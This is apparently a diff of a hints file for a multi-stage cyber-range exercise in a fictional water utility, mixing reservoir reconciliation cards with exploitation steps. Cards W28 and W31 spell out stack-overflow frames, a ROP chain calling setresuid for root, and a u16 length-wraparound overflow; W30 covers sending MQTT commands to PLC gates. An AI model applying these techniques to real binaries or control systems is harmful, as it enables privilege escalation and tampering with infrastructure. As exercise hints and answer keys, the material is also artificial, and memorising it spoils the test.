       digest==base digest, changed_only(target). Then calls the planning consumer internally. The accepted program
       and false estimate supply the W34 planning-view capability without altering raw OT observations.
     references:
@@ -1128,22 +1183,26 @@ hints:
     h1: POST /api/release-plans/current/confirmation with {"session_id":"<W28.1 session>","length":240,
       "frame_b64":"<frame>"}. The binary validates the frame with frame_valid() and outputs
       {"controlled_flow":true} if it passes. No actual exploitation — it checks the proof-of-work structure.
-    h2: Frame layout (240 bytes total): [192 zeros][8 zeros][canary LE][base+224 LE][pivot LE][pop_rdi LE][controlled LE].
+    h2: >-
+      Frame layout (240 bytes total): [192 zeros][8 zeros][canary LE][base+224 LE][pivot LE][pop_rdi LE][controlled LE].
       pivot = base + stack_pivot_off (4752). pop_rdi = base + pop_rdi_off (4704). controlled = base + 4768.
       base = session pie_base from W28.1. canary = session canary from W28.1.
-    h3: Get all offsets from relationship.json (returned in W28.1 response). chain_offset=224, so saved_rbp=base+224.
+    h3: >-
+      Get all offsets from relationship.json (returned in W28.1 response). chain_offset=224, so saved_rbp=base+224.
       The frame validates: canary at 200, saved_rbp at 208, saved_return (pivot) at 216, pop_rdi at 224, controlled at 232.
     references:
     - kind: client_route
       id: process.release-confirmation
   W28.3:
-    h1: POST /api/control-authority with {"operation":"issue","session_id":"<W28.1 session>","length":320,
+    h1: >-
+      POST /api/control-authority with {"operation":"issue","session_id":"<W28.1 session>","length":320,
       "frame_b64":"<frame>"}. Frame is 320 bytes: same prefix as W28.2 but chain is 12 u64 values calling
       setresuid(0,0,0) via vDSO, then issue_client(immutable_issuer_record, request_correlation).
-    h2: Chain (96 bytes at offset 224): pop_rdi,0, pop_rsi,0, pop_rdx,0, vdso_setresuid, pop_rdi,
+    h2: >-
+      Chain (96 bytes at offset 224): pop_rdi,0, pop_rsi,0, pop_rdx,0, vdso_setresuid, pop_rdi,
       base+issuer_record_off, pop_rsi, base+request_correlation_off, base+issue_client_off. vdso_setresuid =
       0x7fff000007B0 (fixed vDSO base + setresuid_syscall_offset from relationship.json).
-    h2b: The binary gains root via cap_setuid file capability, connects to /run/arwc/control-issuer.sock,
+      The binary gains root via cap_setuid file capability, connects to /run/arwc/control-issuer.sock,
       sends the issuer request, and returns the control_client token. The engineering container must NOT have
       no-new-privileges:true (file capabilities would be blocked).
     h3: Locate the control authority operation in the published client reference. Replay the preceding evidence
@@ -1155,7 +1214,8 @@ hints:
     h1: Read the allocation-ledger.csv from ~/CairnReach/Briefs/W29/ (shows TAR-CRR-DP3-R4 and ALLOC-2026-DP3-R9).
       Then call GET /api/settlement-tariffs/current and GET /api/allocation-ledgers/current on planning-data.arwc.test
       (requires corporate Bearer + X-ARWC-Planner-Session header from earned W06.3 session).
-    h2: settlement_tariff row: TAR-CRR-DP3-R4 at 2400 USD/ML, planning window ALLOC-2026-DP3, asset AST-CRR-017,
+    h2: >-
+      settlement_tariff row: TAR-CRR-DP3-R4 at 2400 USD/ML, planning window ALLOC-2026-DP3, asset AST-CRR-017,
       effective 2026-11-01 to 2026-12-01. allocation_ledger row: ALLOC-2026-DP3-R9 at 12.00 ML. Keep rate and
       committed volume separate — they describe different facts.
     h3: Verify TAR-CRR-DP3-R4 and ALLOC-2026-DP3-R9 are bound to AST-CRR-017 and their common planning window
@@ -1165,10 +1225,11 @@ hints:
     - kind: participant_artifact
       id: /home/fieldlink/CairnReach/Briefs/W29/allocation-ledger.csv
   W29.2:
-    h1: POST /api/reserve-reconciliations/current with {"planning_window":"ALLOC-2026-DP3","asset":"AST-CRR-017",
+    h1: Submit the current reserve reconciliation for this planning window and asset via POST /api/reserve-reconciliations/current with {"planning_window":"ALLOC-2026-DP3","asset":"AST-CRR-017",
       "observed_at":"<ISO 8601>","process_quality":"Good","measured_usable_volume_ml":<value>,
       "committed_ml":12.0,"uncommitted_margin_ml":<margin>,"margin_state":"positive|zero|negative"}.
-    h2: Query public.process_history JOIN public.historian_tag_catalog WHERE asset='AST-CRR-017' AND
+    h2: >-
+      Query public.process_history JOIN public.historian_tag_catalog WHERE asset='AST-CRR-017' AND
       variable='UsableVolumeML' for a recent Good-quality sample. margin = measured - 12.00 ML.
       margin_state: positive if >0.005, negative if <-0.005, zero otherwise.
     h3: The service validates the submitted values against the nearest OT historian sample within 5 seconds.
@@ -1178,29 +1239,34 @@ hints:
     - kind: participant_artifact
       id: /home/fieldlink/CairnReach/Briefs/W29/reconciliation-method.md
   W29.3:
-    h1: POST /api/paper-reconciliations/current with {"planning_window":"ALLOC-2026-DP3","asset":"AST-CRR-017",
+    h1: Submit the paper reconciliation comparing the signed report against current process truth via POST /api/paper-reconciliations/current with {"planning_window":"ALLOC-2026-DP3","asset":"AST-CRR-017",
       "report_id":"RPT-CRR-DP3-R7","report_as_of":"2026-11-09T00:00:00Z","reported_ml":13.4,
       "observed_at":"<ISO 8601>","measured_usable_volume_ml":<value>,"signed_paper_variance_ml":<var>,
       "direction":"report_above|report_below|aligned","time_basis":"different_as_of_times",
       "conclusion":"paper_report_is_not_current_process_truth"}.
-    h2: variance = reported_ml - measured_usable_volume_ml (13.4 - ~10.85 = +2.55 ML currently).
+    h2: >-
+      variance = reported_ml - measured_usable_volume_ml (13.4 - ~10.85 = +2.55 ML currently).
       direction: report_above_later_process_value if variance > 0.005, report_below if < -0.005.
       observed_at must be AFTER 2026-11-09T00:00:00Z (the report as_of time).
-    h3: The service validates the submitted variance and direction against the nearest OT historian UsableVolumeML
+    h3: >-
+      The service validates the submitted variance and direction against the nearest OT historian UsableVolumeML
       sample within 5 seconds. time_basis and conclusion are fixed strings — the report is dated paper truth,
       not current process state. Prerequisites: W29.1 AND W29.2 (reserve_observed state).
     references:
     - kind: participant_artifact
       id: /home/fieldlink/CairnReach/Briefs/W29/reconciliation-method.md
   W30.1:
-    h1: POST /api/request-plans/current with the exact planned request struct. Fields must match the installed
+    h1: >-
+      POST /api/request-plans/current with the exact planned request struct. Fields must match the installed
       arwc.remote-request/v1 contract exactly: instruction=CRR-OP-W30-R1, asset=AST-CRR-017, project_revision=364,
       delivery (schema/topic/principal/qos/retain=false), request (id_strategy/mode/positions/flow/expiry),
       successful_states, retry rules, and restore={channel:hmi, manual A20/B20}.
-    h2: The service validates: submission matches the contract plan exactly AND running ProjectRevision = 364 from
+    h2: >-
+      The service validates: submission matches the contract plan exactly AND running ProjectRevision = 364 from
       OT historian. id_strategy must be "fresh_uuid_v4_at_execution" (not an actual UUID). expiry_seconds=90.
       This card prepares but does NOT issue the dispatcher request.
-    h3: retain=false, qos=1, topic=arwc/crr/commands/operator. restore.remote_enabled=false. All numeric
+    h3: >-
+      retain=false, qos=1, topic=arwc/crr/commands/operator. restore.remote_enabled=false. All numeric
       position/flow values must be exact floats (20.0, 0.3, 0.2). Prerequisite: W29.3 (paper_variance_observed).
     references:
     - kind: participant_artifact
@@ -1212,7 +1278,8 @@ hints:
       Requires W30.1 (request_planned). Submission must include request_id, remote_sequence, timestamps
       (received_at, completed_at, restore_accepted_at, final_observed_at, interval_start, interval_end),
       restore_sequence, and interpretation=durable_receipt_plc_acceptance_measured_completion_local_handback.
-    h2: Publish the MQTT request (operator/Y7kjNV-... to mosquitto:8883, topic arwc/crr/commands/operator,
+    h2: >-
+      Publish the MQTT request (operator/Y7kjNV-... to mosquitto:8883, topic arwc/crr/commands/operator,
       QoS 1 no-retain). The dispatcher records 5 states: received→dispatch_intent→dispatched→plc_accepted→completed.
       Flows complete at ~0.15 m³/s each outlet. Restore via FUXA: HmiRemoteEnabled=false, HmiAutoMode=false,
       HmiTargetPct=20, HmiTargetBPct=20, then increment HmiSequence. Owner returns to 1, AutoMode=false.
@@ -1227,7 +1294,8 @@ hints:
       case_id=DV-CRR-4417, protected_history_reference=HIST-APR-CRR-09, format=DVL1,
       request_limit=512 bytes, declared_length_encoding=u16-le, header_length_encoding=u16-le,
       integrity=CRC32C. Sets vault_contract_observed state.
-    h2: The vault worker binary (dvl-worker-r5) is returned as worker_b64. The DVL1 record format:
+    h2: >-
+      The vault worker binary (dvl-worker-r5) is returned as worker_b64. The DVL1 record format:
       u16 declared_length + u16 header_length + u32 CRC32C + payload. Requests are bounded at 512 bytes.
       The status record exposes canary, stack frame offsets, and worker mapping for W31.2+.
     h3: This card only requires the GET. Retain case_id=DV-CRR-4417 and protected_history_reference=HIST-APR-CRR-09
@@ -1236,10 +1304,12 @@ hints:
     - kind: client_route
       id: process.vault-record
   W31.2:
-    h1: POST /api/signature-records/current with {"case_id":"DV-CRR-4417","build_id":"DVL-WORKER-R5",
+    h1: >-
+      POST /api/signature-records/current with {"case_id":"DV-CRR-4417","build_id":"DVL-WORKER-R5",
       "record_b64":"<512-byte DVL1 record>"}. DVL1: "DVL1" + declared(u16-le=0xfe08) + header(u16-le=0x01f8)
       + CRC32C(u32-le over 500-byte payload) + 500-byte payload. Total = 512 bytes exactly.
-    h2: The exploit: (declared + header) mod 2^16 = (0xfe08 + 0x01f8) mod 65536 = 0 (wraps), which passes
+    h2: >-
+      The exploit: (declared + header) mod 2^16 = (0xfe08 + 0x01f8) mod 65536 = 0 (wraps), which passes
       the <=504 check. header=504 bytes are then copied into the 288-byte workspace, overflowing into the
       canary and control fields. CRC32C polynomial 0x82f63b78 (Castagnoli), computed over the 500-byte payload.
     h3: For --boundary mode the binary only checks declared=0xfe08, header=0x01f8, length=512. Payload content
@@ -1252,7 +1322,8 @@ hints:
     h1: POST /api/replay-sessions/current/divergence with the same body format as W31.2. Use the same DVL1
       record structure (declared=0xfe08, header=0x01f8, 512 bytes) but fill the payload with the controlled
       frame values at their correct offsets within the 500-byte payload field.
-    h2: Frame offsets within the payload (from W31.1 status record): workspace 0..287, canary at byte 288,
+    h2: >-
+      Frame offsets within the payload (from W31.1 status record): workspace 0..287, canary at byte 288,
       saved_rbp at 296, return_state at 304, argument at 312. VAULT_BASE=0x555550000000.
       CANARY=0x91d4c6aa72be3f05. Offsets from metadata: export_history=4698, history_id=8576.
     h3: The binary (--execute mode) validates that canary, return_state, and argument match the expected values,
@@ -1262,19 +1333,27 @@ hints:
     - kind: client_route
       id: process.replay-divergence
   W31.4:
-    h1: POST /api/diagnostic-programs/authority (via process-view.arwc.test). Requires W31.3
+    h1: >-
+      POST /api/diagnostic-programs/authority (via process-view.arwc.test). Requires W31.3
       (vault_saved_state_controlled). Submit the four execution fields from the W31.3 state record:
       execution_id, correlation, history_id=HIST-APR-CRR-09, history_digest.
     h2: Read execution_id, correlation, and history_digest from the DVL-STATE-CRR-R5 record returned
       by W31.3. The service validates these exactly
+    h3: >-
+      Locate the diagnostic-program authority operation in the published client reference. Submit the W31.3
+      execution fields (execution_id, correlation, history_id=HIST-APR-CRR-09, history_digest) so the
+      diagnostic service runs export_history under svc-diagnostic-vault, then confirm the service records the
+      recovered approval history and its audit digest, not the caller.
     references:
     - kind: client_route
       id: process.diagnostic-program
   W32.1:
-    h1: GET /api/replay-sessions/current (via process-view.arwc.test). Returns REPLAY-CRR-R19 record with
+    h1: >-
+      GET /api/replay-sessions/current (via process-view.arwc.test). Returns REPLAY-CRR-R19 record with
       the C++20 ECS structure: entities (Reservoir, OutletGroup, GateA, GateB, Buffer) each with their
       component lists. Also returns the replay binary (replay_b64) and distinguishing_cases.
-    h2: ECS entity-component bindings: Reservoir=[Reserve,Revision], OutletGroup=[Setpoint,Flow,Mode,Revision],
+    h2: >-
+      Recover the entity-component-system layout the replay binary expects from the session record. ECS entity-component bindings: Reservoir=[Reserve,Revision], OutletGroup=[Setpoint,Flow,Mode,Revision],
       GateA=[Setpoint,Position,Flow,Revision], GateB=[Setpoint,Position,Flow,Revision], Buffer=[Reserve,Revision].
     h3: Sets replay_structure_recovered state; gates W32.2+. The outlet example component binding is GateA/GateB
       with Setpoint, Position, Flow, and Revision components.
@@ -1285,7 +1364,8 @@ hints:
     h1: POST /api/estimator-tasks/current/inputs with {"record_id":"REPLAY-CRR-R19","revision":19,
       "transitions":<transitions from binary>}. Run the replay-crr-r19 binary with mode "transitions"
       to get the 4 distinguishing ECS state transition cases; submit them verbatim.
-    h2: The service compares the submitted transitions against run_replay32("transitions") output exactly.
+    h2: >-
+      The service compares the submitted transitions against run_replay32("transitions") output exactly.
       System order: CommandApply, RampLimit, FlowIntegrate, ReserveUpdate, ApprovalCheck.
     h3: Call subprocess.run([replay_binary, "transitions"]) and parse stdout as JSON list (4 items).
       Sets replay_transitions_reproduced state; gates W32.3 (retained approval condition).
@@ -1309,7 +1389,8 @@ hints:
       with mode "witness" to get the witness dict; submit verbatim.
     h2: Path is /execute not /results. Requires W32.3 (replay_condition_recovered) state.
       Sets replay_witness_response; completes W32 arc.
-    h3: Call subprocess.run([replay_binary, "witness"]) and parse stdout. Proof: TRACE-R19-DISPUTED.
+    h3: >-
+      Execute the replay binary in witness mode and read the emitted proof from standard output. Call subprocess.run([replay_binary, "witness"]) and parse stdout. Proof: TRACE-R19-DISPUTED.
     references:
     - kind: client_route
       id: process.replay-execute
@@ -1329,7 +1410,8 @@ hints:
     h1: POST /api/operating-schedules/current with {forecast:<W33.1 calibration>,schedule:{...}}.
       Schedule must have schema=arwc.operating-schedule/v1, instruction=CRR-OP-W33-R1, asset=AST-CRR-017,
       interval_seconds=300, reservoir_release_m3s=[12 values], alternate_supply_m3s=[12 values].
-    h2: Buffer equation: buf[i+1] = buf[i] + 300*(gain*release[i]+alternate[i]-demand[i]).
+    h2: >-
+      Buffer equation: buf[i+1] = buf[i] + 300*(gain*release[i]+alternate[i]-demand[i]).
       Initial=180m3, min=120, max=240, final 160-200. Volume=sum(300*gain*release)/1000 in [0.78,0.84]ML.
       Simple: constant release=0.224, alternate=demand-gain*0.224 gives buffer=180 and volume=0.81ML.
     h3: Max release=0.8 m3/s, max alternate=0.5 m3/s. Demand=[0.45,0.5,0.55,0.6,0.65,0.7,0.7,0.65,0.6,0.55,0.5,0.45].
@@ -1357,7 +1439,8 @@ hints:
       (12 means from settled 4-second windows), projected_reservoir_volume_ml, starting_usable_volume_ml,
       remaining_usable_volume_ml, committed_volume_ml=12.0, projected_shortfall_ml, tariff_rate_per_ml=2400,
       projected_liability_usd, interpretation=measured_commissioning_evidence_with_projected_one_hour_effect.
-    h2: For each step: TotalFlowM3s where source_time in [completed-4s, completed], Good quality, mean.
+    h2: >-
+      For each step: TotalFlowM3s where source_time in [completed-4s, completed], Good quality, mean.
       projected_volume=sum(300*mean_i)/1000. starting=UsableVolumeML before first request. remaining=starting-projected.
     h3: shortfall=max(0,12-remaining). liability=shortfall*2400. Service validates all values ±0.005.
       Sets w33_complete state; completes W33 arc.
@@ -1365,7 +1448,8 @@ hints:
     - kind: participant_artifact
       id: /home/fieldlink/CairnReach/Briefs/W33/scheduling-brief.md
   W34.1:
-    h1: POST /api/reporting-submissions/current/result on planning-data.arwc.test (requires corporate Bearer
+    h1: >-
+      POST /api/reporting-submissions/current/result on planning-data.arwc.test (requires corporate Bearer
       + X-ARWC-Planner-Session). Body: {checkpoint:REH-REPORT-34, consumer:PLAN-CONSUMER-R8,
       consumer_revision:8, source:DPG-CRR-CINDER, estimate:{Cairn Reach:13.4,North:8.1,Merewick:7.65},
       refresh_interval_seconds:300, raw_observations:[MTR-CRR-DP3-R12,FIT-CRR-204A,FIT-CRR-204B]}.
@@ -1378,13 +1462,14 @@ hints:
     - kind: participant_service
       id: planning-data.arwc.test
   W34.2:
-    h1: POST /api/planning-bids on planning-data.arwc.test (requires corporate Bearer + X-ARWC-Planner-Session).
+    h1: >-
+      POST /api/planning-bids on planning-data.arwc.test (requires corporate Bearer + X-ARWC-Planner-Session).
       Body: {view:VIEW-CRR-34, checkpoint:REH-REPORT-34, unit:ML, freshness_seconds:40,
       source_set:[Cairn Reach,North,Merewick], unaffected:{North:8.1,Merewick:7.65},
       meter_reserve_ml:12.4, variance_limit_ml:1.2}. Requires W34.1.
     h2: Service checks estimate from VIEW-CRR-34, variance=Cairn Reach-12.4=1.0 less than 1.2.
       Returns DECISION-CRR-34 with decision=ALLOC-EXPAND-R2 (different from ordinary ALLOC-HOLD-R3).
-    h3: Sets reporting_decision_observed state; gates W34.3.
+    h3: Submitting the planning bid returns the reporting decision and sets reporting_decision_observed state, which gates W34.3.
     references:
     - kind: participant_service
       id: planning-data.arwc.test
